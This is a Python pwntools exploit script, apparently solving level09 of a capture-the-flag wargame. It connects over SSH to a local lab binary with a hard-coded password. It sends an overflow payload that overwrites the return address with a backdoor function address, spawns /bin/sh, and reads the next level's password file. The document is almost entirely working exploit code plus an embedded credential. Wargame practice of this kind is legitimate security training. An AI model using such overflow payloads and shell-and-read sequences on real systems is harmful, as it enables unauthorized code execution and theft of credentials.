#!/usr/bin/env python
from pwn import *

context.log_level = 'error'

user = b'A'*40
len = b'\xd0'   #ff was possible, but being precise is satisfying
mes = b'A'*192
ebp = b'B'*8
backdoor = p64(0x55555555488c);
shell = b'/bin/sh'
user_payload = user+len
msg_payload = mes+ebp+backdoor

ip = "127.0.0.1"
p = 4242
flag = 'fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S'
b = '/home/users/level09/level09'

p = ssh(host=ip, port=p, user='level09', password=flag).process(b)
p.sendline(user_payload)
p.sendline(msg_payload)
p.sendline(shell)
p.clean()
p.sendline(b"cat ~end/.pass")
print(p.recvline().decode(), end='')
